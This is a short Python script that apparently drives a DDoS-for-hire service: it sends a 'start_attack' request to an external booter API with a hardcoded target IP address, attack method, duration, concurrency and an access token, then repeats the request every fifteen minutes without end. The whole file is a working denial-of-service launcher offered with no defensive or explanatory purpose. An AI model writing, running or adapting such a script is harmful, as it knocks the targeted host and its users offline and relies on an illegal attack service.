import requests
import time
from requests.structures import CaseInsensitiveDict

url = "https://api.mcstorm.is/start_attack"
headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"
data = "ipport=46.28.106.161&protocol=762&method=http&time=300&concurrent=8&network=2&token=0OTDI0UQGI5UQL43EY6RAHW1YWFR04PJHTEQKHBJY5L77WB636X7KZF9259EFAM9"

while True:
    resp = requests.post(url, headers=headers, data=data)
    print(resp.status_code)
    time.sleep(900)
